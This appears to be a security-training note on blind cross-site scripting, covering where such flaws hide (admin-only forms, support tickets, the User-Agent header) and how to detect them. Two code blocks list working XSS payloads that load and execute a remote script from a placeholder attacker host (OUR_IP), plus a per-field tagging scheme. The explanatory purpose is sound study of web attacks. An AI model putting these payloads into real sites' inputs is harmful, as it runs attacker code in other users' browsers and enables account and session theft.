# Blind XSS

## Overview

A _blind XSS_ vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

They usually occur with forms only accessible by certain users (e.g., admins). Some potential examples:

- Contact forms.
- Reviews.
- Support tickets.
- User details.
- HTTP User-Agent header.

For example, say that after a registration you only see a message that says "Thank you for registering". You won't see how your input is handled, or how it will look in the browser.

## Blind XSS detection

We can use a JavaScript payload that sends an HTTP request back to our server. However, this introduces two isues:

1. We can't know which specific field is vulnerable since any of them may execute our code.
2. The page may be vulnerable but the payload may not work and it's hard to choose.

## Loading a remote script

We can include a remote script within the `<script>` tags. Here are some examples of [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss)

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Then we can test payloads one by one using one of them for all of input fields and appending the name of the field like:

```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```
